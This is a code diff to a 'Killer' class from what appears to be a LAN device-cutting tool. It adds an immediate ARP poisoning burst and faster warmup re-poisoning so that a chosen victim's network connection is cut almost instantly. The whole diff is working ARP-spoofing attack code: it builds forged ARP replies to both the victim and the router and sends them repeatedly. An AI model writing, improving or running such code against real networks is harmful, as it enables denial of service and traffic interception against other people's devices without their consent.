@@ -175,7 +175,57 @@ class Killer:
         seq = self._next_op_seq(mac)
         self.killed[mac] = victim
         self._stop_forwarder(mac)
+        # Symmetric immediate burst on the caller thread so Kill ON cuts the victim as
+        # fast as Kill OFF restores it. Before this, the worker thread sent one packet
+        # then slept ``wait_after`` (2 s) — if the victim missed that first poison
+        # (switch buffering / NIC offload / packet loss), the next attempt was 2 s
+        # later, manifesting as a "delayed Kill ON, instant Kill OFF" asymmetry.
+        # unkill() mirrors this with _restore_arp_now(repeats=3) — keep them paired.
+        self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
         self._kill_arp_worker(victim, wait_after, seq)
+
+    def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
+        """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.
+
+        Designed for the GUI thread — uses ONLY the cached L2 socket. If the
+        cache is cold (prewarm hasn't finished, or _close_socket was called),
+        we skip the burst and let the threaded ARP worker open the socket off
+        the GUI thread. Opening conf.L2socket() on Windows costs 0.5–2 s and
+        would freeze the UI between button-press and row-highlight.
+        """
+        if self.iface.name == 'NULL':
+            return
+        sock = self._socket
+        if sock is None:
+            return
+        to_victim = Ether(dst=victim['mac'])/ARP(
+            op=2,
+            psrc=self.router['ip'],
+            hwsrc=self.iface.mac,
+            pdst=victim['ip'],
+            hwdst=victim['mac']
+        )
+
+        to_router = Ether(dst=self.router['mac'])/ARP(
+            op=2,
+            psrc=victim['ip'],
+            hwsrc=self.iface.mac,
+            pdst=self.router['ip'],
+            hwdst=self.router['mac']
+        )
+
+        for _ in range(max(1, int(repeats))):
+            if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
+                break
+            try:
+                sock.send(to_victim)
+                sock.send(to_router)
+            except Exception:
+                # Socket died mid-burst — let the threaded worker recover.
+                self._socket = None
+                return
+            if delay_s > 0:
+                sleep(delay_s)
 
     def apply_percent_cut(self, victim, pass_percent=100, debug=False):
         """
@@ -288,6 +338,12 @@ class Killer:
             hwdst=self.router['mac']
         )
 
+        # Front-load several short-interval reasserts so a missed first poison
+        # only costs ~80 ms instead of the full ``wait_after`` (2 s). After the
+        # warmup we fall back to the steady-state cadence — ARP caches survive
+        # 30–120 s so the 2 s sleep is fine once the victim's cache is flipped.
+        warmup_remaining = 4
+        warmup_gap = 0.08
         while (
             victim['mac'] in self.killed
             and self.iface.name != 'NULL'
@@ -296,6 +352,10 @@ class Killer:
             # Send packets using persistent socket
             self._send_packet(to_victim)
             self._send_packet(to_router)
+            if warmup_remaining > 0:
+                warmup_remaining -= 1
+                sleep(warmup_gap)
+                continue
             # Sleep in short slices so OFF takes effect quickly (avoid UI/backend desync feel).
             total_wait = max(0.05, float(wait_after))
             slept = 0.0
